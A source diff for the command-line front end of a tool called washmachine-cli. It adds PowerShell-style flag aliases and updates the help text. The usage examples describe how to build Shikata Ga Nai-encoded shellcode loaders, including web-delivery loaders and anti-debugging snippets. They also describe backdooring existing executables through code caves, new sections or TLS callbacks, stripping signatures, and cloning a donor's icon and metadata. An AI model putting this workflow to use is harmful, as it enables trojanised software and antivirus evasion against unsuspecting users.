@@ -32,25 +32,39 @@ public static partial class Program
     {
         ["encode"] = new[]
         {
-            "--shellcode", "-s", "--shellcode-hex", "--shellcode-url", "-u", "--template", "-t",
-            "--encoder", "-e", "--envelope", "-v",
-            "--shikata-ga-nai", "--sgn", "--shikata-enc", "--shikata-max", "--sgn-placement",
-            "--clone-from", "--clone-resources", "--no-clone-resources",
-            "--clone-icon", "--no-clone-icon", "--clone-metadata", "--no-clone-metadata",
-            "--pad-nops",
-            "--snippet", "--text", "--verbose", "--json"
+            "-Shellcode", "--shellcode", "-s", "-ShellcodeHex", "--shellcode-hex",
+            "-ShellcodeUrl", "--shellcode-url", "-u", "-Template", "--template", "-t",
+            "-Encoder", "--encoder", "-e", "-Envelope", "--envelope", "-v",
+            "-Sgn", "--sgn", "--shikata-ga-nai", "-SgnCount", "--shikata-enc",
+            "-SgnMax", "--shikata-max", "-SgnPlacement", "--sgn-placement",
+            "-CloneFrom", "--clone-from", "-CloneResources", "--clone-resources",
+            "-NoCloneResources", "--no-clone-resources", "-CloneIcon", "--clone-icon",
+            "-NoCloneIcon", "--no-clone-icon", "-CloneMetadata", "--clone-metadata",
+            "-NoCloneMetadata", "--no-clone-metadata", "-PadNops", "--pad-nops",
+            "-Snippet", "--snippet", "-Text", "--text", "-Verbose", "--verbose",
+            "-Json", "--json"
         },
-        ["analyze"] = new[] { "--json" },
+        ["analyze"] = new[] { "-Pe", "--pe", "-Json", "--json" },
         ["backdoor"] = new[]
         {
-            "--pe", "--shellcode", "-s", "--output", "-o", "--method", "-m", "--encryption", "--enc",
-            "--xor-key", "--section-name", "--no-remove-sig", "--no-patch-subsystem", "--carrier",
-            "--invoke", "--no-preserve-entry", "--no-patch-iat", "--no-patch-exit", "--cave-min-size",
-            "--dry-run", "--verbose", "--json"
+            "-Pe", "--pe", "-Shellcode", "--shellcode", "-s", "-Output", "--output", "-o",
+            "-Method", "--method", "-m", "-Encryption", "--encryption", "--enc",
+            "-XorKey", "--xor-key", "-SectionName", "--section-name",
+            "-NoRemoveSig", "--no-remove-sig", "-NoPatchSubsystem", "--no-patch-subsystem",
+            "-Carrier", "--carrier", "--invoke", "-NoPreserveEntry", "--no-preserve-entry",
+            "-NoPatchIat", "--no-patch-iat", "-NoPatchExit", "--no-patch-exit",
+            "-CaveMinSize", "--cave-min-size", "-DryRun", "--dry-run",
+            "-SessionLog", "--session-log", "-NoSessionLog", "--no-session-log",
+            "-Verbose", "--verbose", "-Json", "--json"
         },
-        ["strip"] = new[] { "-o", "--output", "--mode", "-m", "--section", "--analyze", "--no-trim", "--range" },
+        ["strip"] = new[]
+        {
+            "-Pe", "--pe", "-Output", "--output", "-o", "-Mode", "--mode", "-m",
+            "-Section", "--section", "-Range", "--range", "-Analyze", "--analyze",
+            "-NoTrim", "--no-trim"
+        },
         ["show"] = ShowTargets,
-        ["provision"] = new[] { "--core-only" },
+        ["provision"] = new[] { "-CoreOnly", "--core-only" },
         ["test"] = new[] { "--help", "-h" },
         ["help"] = new[] { "encode", "analyze", "backdoor", "strip", "show", "provision", "test" }
     };
@@ -600,10 +614,10 @@ public static partial class Program
 
         return command.ToLowerInvariant() switch
         {
-            "backdoor" when previousToken is "--method" or "-m" => BackdoorMethodValues,
-            "backdoor" when previousToken is "--encryption" or "--enc" => BackdoorEncryptionValues,
-            "backdoor" when previousToken is "--carrier" or "--invoke" => BackdoorCarrierValues,
-            "strip" when previousToken is "--mode" or "-m" => StripModeValues,
+            "backdoor" when previousToken is "-Method" or "--method" or "-m" => BackdoorMethodValues,
+            "backdoor" when previousToken is "-Encryption" or "--encryption" or "--enc" => BackdoorEncryptionValues,
+            "backdoor" when previousToken is "-Carrier" or "--carrier" or "--invoke" => BackdoorCarrierValues,
+            "strip" when previousToken is "-Mode" or "--mode" or "-m" => StripModeValues,
             "show" or "list" when previousToken is "modules" or "module" or "snippets" => GetShowModuleCategoryCandidates(),
             _ => Array.Empty<string>()
         };
@@ -772,14 +786,41 @@ public static partial class Program
             return 0;
         }
 
-        var peFile = args[0];
+        string? peFile = null;
+        bool jsonOutput = false;
+
+        // First arg can be positional PE file (does not start with '-')
+        int startIndex = 0;
+        if (!args[0].StartsWith("-", StringComparison.Ordinal))
+        {
+            peFile = args[0];
+            startIndex = 1;
+        }
+
+        for (int i = startIndex; i < args.Length; i++)
+        {
+            switch (args[i])
+            {
+                case "-Pe" or "--pe" when i + 1 < args.Length:
+                    peFile = args[++i];
+                    break;
+                case "-Json" or "--json":
+                    jsonOutput = true;
+                    break;
+            }
+        }
+
+        if (peFile is null)
+        {
+            AnsiConsole.MarkupLine("[red]Error:[/] No PE file specified. Use [white]-Pe <file>[/] or provide a positional argument.");
+            return 1;
+        }
+
         if (!File.Exists(peFile))
         {
             AnsiConsole.MarkupLine($"[red]Error:[/] File not found: {Markup.Escape(peFile)}");
             return 1;
         }
-
-        bool jsonOutput = args.Contains("--json");
         var logger = new ConsoleLogger();
         var analyzer = new PeAnalyzerService(logger);
 
@@ -1447,47 +1488,47 @@ public static partial class Program
         {
             switch (args[i])
             {
-                case "--pe" when i + 1 < args.Length:
+                case "-Pe" or "--pe" when i + 1 < args.Length:
                     peFile = args[++i]; break;
-                case "--shellcode" or "-s" when i + 1 < args.Length:
+                case "-Shellcode" or "--shellcode" or "-s" when i + 1 < args.Length:
                     shellcodeFile = args[++i]; break;
-                case "--output" or "-o" when i + 1 < args.Length:
+                case "-Output" or "--output" or "-o" when i + 1 < args.Length:
                     outputFile = args[++i]; break;
-                case "--method" or "-m" when i + 1 < args.Length:
+                case "-Method" or "--method" or "-m" when i + 1 < args.Length:
                     method = args[++i].ToLowerInvariant(); break;
-                case "--encryption" or "--enc" when i + 1 < args.Length:
+                case "-Encryption" or "--encryption" or "--enc" when i + 1 < args.Length:
                     encryption = args[++i].ToLowerInvariant(); break;
-                case "--xor-key" when i + 1 < args.Length:
+                case "-XorKey" or "--xor-key" when i + 1 < args.Length:
                     var keyStr = args[++i];
                     xorKey = keyStr.StartsWith("0x", StringComparison.OrdinalIgnoreCase)
                         ? Convert.ToByte(keyStr, 16)
                         : byte.Parse(keyStr);
                     break;
-                case "--section-name" when i + 1 < args.Length:
+                case "-SectionName" or "--section-name" when i + 1 < args.Length:
                     sectionName = args[++i]; break;
-                case "--no-remove-sig":
+                case "-NoRemoveSig" or "--no-remove-sig":
                     removeSig = false; break;
-                case "--no-patch-subsystem":
+                case "-NoPatchSubsystem" or "--no-patch-subsystem":
                     patchSubsystem = false; break;
-                case "--carrier" or "--invoke" when i + 1 < args.Length:
+                case "-Carrier" or "--carrier" or "--invoke" when i + 1 < args.Length:
                     carrier = args[++i].ToLowerInvariant(); break;
-                case "--no-preserve-entry":
+                case "-NoPreserveEntry" or "--no-preserve-entry":
                     preserveEntry = false; break;
-                case "--no-patch-iat":
+                case "-NoPatchIat" or "--no-patch-iat":
                     patchIat = false; break;
-                case "--no-patch-exit":
+                case "-NoPatchExit" or "--no-patch-exit":
                     patchExitCalls = false; break;
-                case "--cave-min-size" when i + 1 < args.Length:
+                case "-CaveMinSize" or "--cave-min-size" when i + 1 < args.Length:
                     minCaveSize = int.Parse(args[++i]); break;
-                case "--dry-run":
+                case "-DryRun" or "--dry-run":
                     dryRun = true; break;
-                case "--verbose":
+                case "-Verbose" or "--verbose":
                     verbose = true; break;
-                case "--json":
+                case "-Json" or "--json":
                     jsonOutput = true; break;
-                case "--no-session-log":
+                case "-NoSessionLog" or "--no-session-log":
                     sessionLogOverride = false; break;
-                case "--session-log":
+                case "-SessionLog" or "--session-log":
                     sessionLogOverride = true; break;
                 default:
                     if (args[i].StartsWith("-"))
@@ -2117,43 +2158,43 @@ public static partial class Program
                     "Source input (choose one)",
                     "Provide exactly one payload source per run.",
                     [
-                        new UsageOption("-s, --shellcode <file>", "Read raw shellcode bytes from a .bin file."),
-                        new UsageOption("--shellcode-hex <hex>", "Inline raw hex bytes such as FC4883E4F0... or \\xfc\\x48\\x83...."),
-                        new UsageOption("-u, --shellcode-url <url>", "Build a web-delivery loader that fetches the payload at runtime."),
+                        new UsageOption("-s, -Shellcode <file>", "Read raw shellcode bytes from a .bin file."),
+                        new UsageOption("-ShellcodeHex <hex>", "Inline raw hex bytes such as FC4883E4F0... or \\xfc\\x48\\x83...."),
+                        new UsageOption("-u, -ShellcodeUrl <url>", "Build a web-delivery loader that fetches the payload at runtime."),
                     ]),
                 new UsageOptionGroup(
                     "Encoding and build",
                     "These values control the Bin2Shell stage and the generated loader.",
                     [
-                        new UsageOption("-t, --template <id>", "Template ID from the active YAML playbook.", "minimal"),
-                        new UsageOption("-e, --encoder <index>", "Bin2Shell encoder index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
-                        new UsageOption("-v, --envelope <index>", "Bin2Shell envelope index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
-                        new UsageOption("--sgn, --shikata-ga-nai", "Enable Shikata Ga Nai preprocessing before compilation."),
-                        new UsageOption("--shikata-enc <count>", "Shikata Ga Nai iteration count. Setting this also enables SGN.", "1"),
-                        new UsageOption("--shikata-max <bytes>", "Maximum SGN decoder-obfuscation bytes. Setting this also enables SGN.", "50"),
-                        new UsageOption("--sgn-placement <mode>", "When to apply SGN relative to the Bin2Shell stage.", "pre", "pre | post"),
-                        new UsageOption("--verbose", "Show detailed progress, compiler output, and warnings."),
-                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled terminal report."),
+                        new UsageOption("-t, -Template <id>", "Template ID from the active YAML playbook.", "minimal"),
+                        new UsageOption("-e, -Encoder <index>", "Bin2Shell encoder index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
+                        new UsageOption("-v, -Envelope <index>", "Bin2Shell envelope index from the local catalog.", "0", "0 = none; run show encoders to discover the live catalog"),
+                        new UsageOption("-Sgn", "Enable Shikata Ga Nai preprocessing before compilation."),
+                        new UsageOption("-SgnCount <count>", "Shikata Ga Nai iteration count. Setting this also enables SGN.", "1"),
+                        new UsageOption("-SgnMax <bytes>", "Maximum SGN decoder-obfuscation bytes. Setting this also enables SGN.", "50"),
+                        new UsageOption("-SgnPlacement <mode>", "When to apply SGN relative to the Bin2Shell stage.", "pre", "pre | post"),
+                        new UsageOption("-Verbose", "Show detailed progress, compiler output, and warnings."),
+                        new UsageOption("-Json", "Emit machine-friendly JSON instead of the styled terminal report."),
                     ]),
                 new UsageOptionGroup(
                     "Template overrides",
                     "Use these flags to steer the playbook without editing YAML.",
                     [
-                        new UsageOption("--snippet <section>=<id[,id...]>", "Override one snippet section. Multi-select sections accept comma-separated IDs in a single flag or repeated flags."),
-                        new UsageOption("--text <input-id>=<value>", "Provide or override a text input that a template/snippet expects."),
+                        new UsageOption("-Snippet <section>=<id[,id...]>", "Override one snippet section. Multi-select sections accept comma-separated IDs in a single flag or repeated flags."),
+                        new UsageOption("-Text <input-id>=<value>", "Provide or override a text input that a template/snippet expects."),
                     ]),
                 new UsageOptionGroup(
                     "Post-compile finishing",
                     "These only apply after a successful compile.",
                     [
-                        new UsageOption("--clone-from <exe>", "Clone icon, metadata, and resources from another executable."),
-                        new UsageOption("--clone-resources", "Force general resource cloning on when --clone-from is set."),
-                        new UsageOption("--no-clone-resources", "Disable general resource cloning even when --clone-from is set."),
-                        new UsageOption("--clone-icon", "Force icon cloning on when --clone-from is set."),
-                        new UsageOption("--no-clone-icon", "Disable icon cloning even when --clone-from is set."),
-                        new UsageOption("--clone-metadata", "Force VERSIONINFO metadata cloning on when --clone-from is set."),
-                        new UsageOption("--no-clone-metadata", "Disable VERSIONINFO metadata cloning even when --clone-from is set."),
-                        new UsageOption("--pad-nops <bytes>", "Append NOP bytes to inflate the final executable size."),
+                        new UsageOption("-CloneFrom <exe>", "Clone icon, metadata, and resources from another executable."),
+                        new UsageOption("-CloneResources", "Force general resource cloning on when -CloneFrom is set."),
+                        new UsageOption("-NoCloneResources", "Disable general resource cloning even when -CloneFrom is set."),
+                        new UsageOption("-CloneIcon", "Force icon cloning on when -CloneFrom is set."),
+                        new UsageOption("-NoCloneIcon", "Disable icon cloning even when -CloneFrom is set."),
+                        new UsageOption("-CloneMetadata", "Force VERSIONINFO metadata cloning on when -CloneFrom is set."),
+                        new UsageOption("-NoCloneMetadata", "Disable VERSIONINFO metadata cloning even when -CloneFrom is set."),
+                        new UsageOption("-PadNops <bytes>", "Append NOP bytes to inflate the final executable size."),
                     ]),
             ],
             Sections:
@@ -2164,7 +2205,7 @@ public static partial class Program
                     [
                         new UsageNote("Provisioning", "Bin2Shell is provisioned automatically before compile. Optional SGN is provisioned automatically when an SGN flag is used."),
                         new UsageNote("Templates", "The selected template decides which snippet sections exist and which defaults are applied."),
-                        new UsageNote("Snippet syntax", "Use --snippet section=id for single-select sections and --snippet section=id1,id2 for multi-select sections."),
+                        new UsageNote("Snippet syntax", "Use -Snippet section=id for single-select sections and -Snippet section=id1,id2 for multi-select sections."),
                         new UsageNote("Discovery", "Run show templates, show modules, and show encoders to inspect live catalog data on this machine."),
                     ]),
                 new UsageSection(
@@ -2180,10 +2221,10 @@ public static partial class Program
             [
                 new UsageExample("washmachine-cli encode -s .\\payload.bin -t minimal", "Compile a minimal loader from a local file.", "PowerShell / pwsh"),
                 new UsageExample("washmachine-cli encode -s ./payload.bin -e 1 -v 1", "Add a Bin2Shell encoder and envelope to a file-based build.", "Bash / Zsh"),
-                new UsageExample("washmachine-cli encode --shellcode-hex \"FC4883E4F0...\" --snippet antidebugging=IsDebuggerPresentCheck", "Build directly from inline hex and override one snippet.", "Any shell"),
-                new UsageExample("washmachine-cli encode -u https://host/payload.bin --verbose", "Generate a web-delivery loader from a hosted payload URL.", "Any shell"),
-                new UsageExample("washmachine-cli encode -s payload.bin --sgn --shikata-enc 2 --shikata-max 64", "Preprocess shellcode with SGN before the normal encode pipeline.", "Any shell"),
-                new UsageExample("washmachine-cli encode -s payload.bin --clone-from donor.exe --no-clone-icon --pad-nops 1048576", "Finalize the output by cloning donor resources and inflating size.", "Any shell"),
+                new UsageExample("washmachine-cli encode -ShellcodeHex \"FC4883E4F0...\" -Snippet antidebugging=IsDebuggerPresentCheck", "Build directly from inline hex and override one snippet.", "Any shell"),
+                new UsageExample("washmachine-cli encode -u https://host/payload.bin -Verbose", "Generate a web-delivery loader from a hosted payload URL.", "Any shell"),
+                new UsageExample("washmachine-cli encode -s payload.bin -Sgn -SgnCount 2 -SgnMax 64", "Preprocess shellcode with SGN before the normal encode pipeline.", "Any shell"),
+                new UsageExample("washmachine-cli encode -s payload.bin -CloneFrom donor.exe -NoCloneIcon -PadNops 1048576", "Finalize the output by cloning donor resources and inflating size.", "Any shell"),
             ],
             Related:
             [
@@ -2207,8 +2248,8 @@ public static partial class Program
                     "Input and output",
                     "Only the target PE is required.",
                     [
-                        new UsageOption("<pe-file>", "Path to the PE file to inspect."),
-                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled report."),
+                        new UsageOption("<pe-file>  or  -Pe <file>", "Path to the PE file to inspect."),
+                        new UsageOption("-Json", "Emit machine-friendly JSON instead of the styled report."),
                     ]),
             ],
             Sections:
@@ -2225,7 +2266,7 @@ public static partial class Program
             Examples:
             [
                 new UsageExample("washmachine-cli analyze .\\target.exe", "Inspect a PE interactively before patching it.", "PowerShell / pwsh"),
-                new UsageExample("washmachine-cli analyze ./target.exe --json", "Feed PE analysis into another script or tool.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli analyze -Pe ./target.exe -Json", "Feed PE analysis into another script or tool.", "Bash / Zsh"),
             ],
             Related:
             [
@@ -2237,7 +2278,7 @@ public static partial class Program
         new(
             Name: "backdoor",
             Summary: "Inject a prepared flat .bin payload into an existing PE file.",
-            Syntax: "washmachine-cli backdoor --pe <file> --shellcode <file> [options]",
+            Syntax: "washmachine-cli backdoor -Pe <file> -Shellcode <file> [options]",
             Description: "Backdoor modifies a target PE after you already know the payload bytes you want to embed.",
             WhenToUse: "Use it after analyze or strip when the goal is to patch an existing PE rather than compile a new loader.",
             Output: "Writes a patched PE. Session logs go to logging/backdoor_<timestamp>_<guid>/ unless disabled for the run.",
@@ -2247,32 +2288,32 @@ public static partial class Program
                     "Required input",
                     "Both files are required for the supported workflow.",
                     [
-                        new UsageOption("--pe <file>", "Target EXE or DLL to modify."),
-                        new UsageOption("-s, --shellcode <file>", "Flat .bin payload to inject."),
+                        new UsageOption("-Pe <file>", "Target EXE or DLL to modify."),
+                        new UsageOption("-s, -Shellcode <file>", "Flat .bin payload to inject."),
                     ]),
                 new UsageOptionGroup(
                     "Injection and output",
                     "Choose how the payload is placed and where the patched file lands.",
                     [
-                        new UsageOption("-o, --output <file>", "Destination path for the patched PE.", "<input>.backdoored.exe"),
-                        new UsageOption("-m, --method <method>", "Injection method used to place the payload.", "code-cave", "code-cave | new-section | section-ext | text-pad | tls-callback"),
-                        new UsageOption("--section-name <name>", "Section name used by methods that create PE section data.", ".extra"),
-                        new UsageOption("--cave-min-size <bytes>", "Minimum code-cave size when scanning for code-cave placement."),
-                        new UsageOption("--dry-run", "Analyze feasibility and planned changes without writing an output file."),
+                        new UsageOption("-o, -Output <file>", "Destination path for the patched PE.", "<input>.backdoored.exe"),
+                        new UsageOption("-m, -Method <method>", "Injection method used to place the payload.", "code-cave", "code-cave | new-section | section-ext | text-pad | tls-callback"),
+                        new UsageOption("-SectionName <name>", "Section name used by methods that create PE section data.", ".extra"),
+                        new UsageOption("-CaveMinSize <bytes>", "Minimum code-cave size when scanning for code-cave placement."),
+                        new UsageOption("-DryRun", "Analyze feasibility and planned changes without writing an output file."),
                     ]),
                 new UsageOptionGroup(
                     "Behavior, compatibility, and logging",
                     "These flags shape the patching pass and reporting.",
                     [
-                        new UsageOption("--carrier, --invoke <mode>", "Payload invocation strategy. The current implementation supports entry-point only.", "entry-point", "entry-point"),
-                        new UsageOption("--enc, --encryption <mode>", "Payload encoding/encryption mode. The current implementation supports none only.", "none", "none"),
-                        new UsageOption("--no-remove-sig", "Keep the Authenticode signature instead of removing it."),
-                        new UsageOption("--no-patch-subsystem", "Leave the subsystem unchanged instead of patching to GUI."),
-                        new UsageOption("--no-patch-exit", "Do not rewrite exit behavior after the payload runs."),
-                        new UsageOption("--session-log", "Force per-run session logging on, regardless of saved app settings."),
-                        new UsageOption("--no-session-log", "Force per-run session logging off, regardless of saved app settings."),
-                        new UsageOption("--verbose", "Show detailed discovery and patching logs."),
-                        new UsageOption("--json", "Emit machine-friendly JSON instead of the styled report."),
+                        new UsageOption("-Carrier <mode>", "Payload invocation strategy. The current implementation supports entry-point only.", "entry-point", "entry-point"),
+                        new UsageOption("-Encryption <mode>", "Payload encoding/encryption mode. The current implementation supports none only.", "none", "none"),
+                        new UsageOption("-NoRemoveSig", "Keep the Authenticode signature instead of removing it."),
+                        new UsageOption("-NoPatchSubsystem", "Leave the subsystem unchanged instead of patching to GUI."),
+                        new UsageOption("-NoPatchExit", "Do not rewrite exit behavior after the payload runs."),
+                        new UsageOption("-SessionLog", "Force per-run session logging on, regardless of saved app settings."),
+                        new UsageOption("-NoSessionLog", "Force per-run session logging off, regardless of saved app settings."),
+                        new UsageOption("-Verbose", "Show detailed discovery and patching logs."),
+                        new UsageOption("-Json", "Emit machine-friendly JSON instead of the styled report."),
                     ]),
             ],
             Sections:
@@ -2294,15 +2335,15 @@ public static partial class Program
                     [
                         "The backdoor flow expects a ready-to-run flat .bin payload. Use encode when you need to build a loader first.",
                         "Only the entry-point carrier is implemented today. Other historical carrier names are intentionally not documented as supported workflows.",
-                        "Only --encryption none is implemented today. Prepare payload transformation before the backdoor step if you need custom encoding.",
+                        "Only -Encryption none is implemented today. Prepare payload transformation before the backdoor step if you need custom encoding.",
                     ]),
             ],
             Examples:
             [
-                new UsageExample("washmachine-cli backdoor --pe .\\app.exe -s .\\payload.bin", "Patch a PE with the default code-cave strategy.", "PowerShell / pwsh"),
-                new UsageExample("washmachine-cli backdoor --pe ./target.exe -s ./payload.bin -m new-section -o ./patched.exe", "Use a new section when you want predictable capacity.", "Bash / Zsh"),
-                new UsageExample("washmachine-cli backdoor --pe target.exe -s payload.bin -m text-pad --dry-run --verbose", "Check whether text padding is viable before writing output.", "Any shell"),
-                new UsageExample("washmachine-cli backdoor --pe target.exe -s payload.bin -m tls-callback", "Attempt TLS callback placement on a compatible target.", "Any shell"),
+                new UsageExample("washmachine-cli backdoor -Pe .\\app.exe -s .\\payload.bin", "Patch a PE with the default code-cave strategy.", "PowerShell / pwsh"),
+                new UsageExample("washmachine-cli backdoor -Pe ./target.exe -s ./payload.bin -m new-section -o ./patched.exe", "Use a new section when you want predictable capacity.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m text-pad -DryRun -Verbose", "Check whether text padding is viable before writing output.", "Any shell"),
+                new UsageExample("washmachine-cli backdoor -Pe target.exe -s payload.bin -m tls-callback", "Attempt TLS callback placement on a compatible target.", "Any shell"),
             ],
             Related:
             [
@@ -2315,28 +2356,28 @@ public static partial class Program
         new(
             Name: "strip",
             Summary: "Extract flat bytes from a PE so they can be inspected, reused, or re-injected.",
-            Syntax: "washmachine-cli strip <pe-file> [options]",
+            Syntax: "washmachine-cli strip <pe-file>  or  strip -Pe <file> [options]",
             Description: "Strip can carve bytes from the entry-point section, a named section, all executable sections, or an explicit raw range.",
             WhenToUse: "Use it to peel shellcode out of a compiled loader or to carve a known range from a PE.",
-            Output: "Writes a .bin file by default, or prints a section-analysis view when --analyze is used.",
+            Output: "Writes a .bin file by default, or prints a section-analysis view when -Analyze is used.",
             OptionGroups:
             [
                 new UsageOptionGroup(
                     "Input and extraction target",
                     "Choose what part of the PE to extract.",
                     [
-                        new UsageOption("<pe-file>", "PE file to strip."),
-                        new UsageOption("-m, --mode <mode>", "Extraction mode.", "ep", "ep | section | all-exec | range"),
-                        new UsageOption("--section <name>", "Section name used when --mode section is selected."),
-                        new UsageOption("--range <start:len>", "Raw file range used when --mode range is selected. Hex values are accepted."),
+                        new UsageOption("<pe-file>  or  -Pe <file>", "PE file to strip."),
+                        new UsageOption("-m, -Mode <mode>", "Extraction mode.", "ep", "ep | section | all-exec | range"),
+                        new UsageOption("-Section <name>", "Section name used when -Mode section is selected."),
+                        new UsageOption("-Range <start:len>", "Raw file range used when -Mode range is selected. Hex values are accepted."),
                     ]),
                 new UsageOptionGroup(
                     "Output and inspection",
                     "Control how the extracted bytes are written and whether analysis is shown first.",
                     [
-                        new UsageOption("-o, --output <file>", "Destination path for the extracted .bin.", "<input>.bin"),
-                        new UsageOption("--no-trim", "Keep trailing null bytes in the extracted result."),
-                        new UsageOption("--analyze", "Print section layout and entry-point context instead of extracting."),
+                        new UsageOption("-o, -Output <file>", "Destination path for the extracted .bin.", "<input>.bin"),
+                        new UsageOption("-NoTrim", "Keep trailing null bytes in the extracted result."),
+                        new UsageOption("-Analyze", "Print section layout and entry-point context instead of extracting."),
                     ]),
             ],
             Sections:
@@ -2354,17 +2395,17 @@ public static partial class Program
                     "Range format",
                     Bullets:
                     [
-                        "Decimal and hex are both accepted. Example: --range 1024:512 or --range 0x400:0x200.",
+                        "Decimal and hex are both accepted. Example: -Range 1024:512 or -Range 0x400:0x200.",
                         "Run analyze first when you want to confirm offsets and section names before stripping.",
                     ]),
             ],
             Examples:
             [
                 new UsageExample("washmachine-cli strip .\\loader.exe", "Extract from the entry point to the end of the containing section.", "PowerShell / pwsh"),
-                new UsageExample("washmachine-cli strip ./loader.exe -m section --section .text", "Dump one named section.", "Bash / Zsh"),
+                new UsageExample("washmachine-cli strip ./loader.exe -m section -Section .text", "Dump one named section.", "Bash / Zsh"),
                 new UsageExample("washmachine-cli strip loader.exe -m all-exec -o payload.bin", "Combine all executable sections into one flat payload.", "Any shell"),
-                new UsageExample("washmachine-cli strip loader.exe -m range --range 0x400:0x200", "Extract a raw offset range using hex.", "Any shell"),
-                new UsageExample("washmachine-cli strip loader.exe --analyze", "Preview section layout without writing a .bin.", "Any shell"),
+                new UsageExample("washmachine-cli strip loader.exe -m range -Range 0x400:0x200", "Extract a raw offset range using hex.", "Any shell"),
+                new UsageExample("washmachine-cli strip loader.exe -Analyze", "Preview section layout without writing a .bin.", "Any shell"),
             ],
             Related:
             [
@@ -2378,7 +2419,7 @@ public static partial class Program
         new(
             Name: "provision",
             Summary: "Download the external tooling required for encoding features.",
-            Syntax: "washmachine-cli provision [--core-only]",
+            Syntax: "washmachine-cli provision [-CoreOnly]",
             Description: "Provision fetches Bin2Shell and, when requested, the optional SGN bundle into the local Tools directory next to the CLI.",
             WhenToUse: "Run it once after install, or again whenever the Tools directory is missing or incomplete.",
             Output: "Downloads archives, installs them under Tools, and refreshes local algorithm descriptions when possible.",
@@ -2388,7 +2429,7 @@ public static partial class Program
                     "Scope",
                     "Provisioning always requires network access.",
                     [
-                        new UsageOption("--core-only", "Download only Bin2Shell and skip optional tooling."),
+                        new UsageOption("-CoreOnly", "Download only Bin2Shell and skip optional tooling."),
                     ]),
             ],
             Sections:
@@ -2398,7 +2439,7 @@ public static partial class Program
                     Notes:
                     [
                         new UsageNote("Bin2Shell", "The bundled provisioning flow is intended to make the Python-based encoding dependency available locally."),
-                        new UsageNote("SGN", "The automatic optional SGN download currently targets Windows release assets. Cross-platform users should prefer --core-only unless they already manage SGN separately."),
+                        new UsageNote("SGN", "The automatic optional SGN download currently targets Windows release assets. Cross-platform users should prefer -CoreOnly unless they already manage SGN separately."),
                     ]),
                 new UsageSection(
                     "When it helps",
@@ -2411,7 +2452,7 @@ public static partial class Program
             Examples:
             [
                 new UsageExample("washmachine-cli provision", "Download Bin2Shell and optional tooling.", "Any shell"),
-                new UsageExample("washmachine-cli provision --core-only", "Download only the core encoding dependency.", "Any shell"),
+                new UsageExample("washmachine-cli provision -CoreOnly", "Download only the core encoding dependency.", "Any shell"),
             ],
             Related:
             [
@@ -2492,7 +2533,7 @@ public static partial class Program
             return 0;
         }
 
-        string peFile = args[0];
+        string? peFile = null;
         string? outputFile = null;
         string? sectionName = null;
         bool analyze = false;
@@ -2500,14 +2541,25 @@ public static partial class Program
         var mode = StripMode.EntryPointToEnd;
         uint rangeStart = 0, rangeLen = 0;
 
-        for (int i = 1; i < args.Length; i++)
+        // First arg can be positional PE file (does not start with '-')
+        int startIndex = 0;
+        if (!args[0].StartsWith("-", StringComparison.Ordinal))
+        {
+            peFile = args[0];
+            startIndex = 1;
+        }
+
+        for (int i = startIndex; i < args.Length; i++)
         {
             switch (args[i])
             {
-                case "-o" or "--output":
+                case "-Pe" or "--pe" when i + 1 < args.Length:
+                    peFile = args[++i];
+                    break;
+                case "-o" or "-Output" or "--output":
                     if (++i < args.Length) outputFile = args[i];
                     break;
-                case "--mode" or "-m":
+                case "-Mode" or "--mode" or "-m":
                     if (++i < args.Length)
                     {
                         mode = args[i].ToLowerInvariant() switch
@@ -2520,16 +2572,16 @@ public static partial class Program
                         };
                     }
                     break;
-                case "--section":
+                case "-Section" or "--section":
                     if (++i < args.Length) sectionName = args[i];
                     break;
-                case "--analyze":
+                case "-Analyze" or "--analyze":
                     analyze = true;
                     break;
-                case "--no-trim":
+                case "-NoTrim" or "--no-trim":
                     noTrim = true;
                     break;
-                case "--range":
+                case "-Range" or "--range":
                     if (++i < args.Length)
                     {
                         var parts = args[i].Split(':');
@@ -2541,6 +2593,12 @@ public static partial class Program
                     }
                     break;
             }
+        }
+
+        if (peFile is null)
+        {
+            AnsiConsole.MarkupLine("[red]Error:[/] No PE file specified. Use [white]-Pe <file>[/] or provide a positional argument.");
+            return 1;
         }
 
         if (!File.Exists(peFile))
@@ -2662,8 +2720,10 @@ public static partial class Program
         var logger = new ConsoleLogger();
         var paths = new AppPaths();
         var provisioner = new RequirementProvisioner(paths, logger);
-        bool coreOnly = args.Any(a => string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase));
-        var unknownProvisionArg = args.FirstOrDefault(a => !string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase));
+        bool coreOnly = args.Any(a => string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase)
+                                    || string.Equals(a, "-CoreOnly", StringComparison.Ordinal));
+        var unknownProvisionArg = args.FirstOrDefault(a => !string.Equals(a, "--core-only", StringComparison.OrdinalIgnoreCase)
+                                                         && !string.Equals(a, "-CoreOnly", StringComparison.Ordinal));
         if (unknownProvisionArg != null)
         {
             AnsiConsole.MarkupLine($"[{UiColors.Error}]Error:[/] Unknown option for provision: {Markup.Escape(unknownProvisionArg)}");
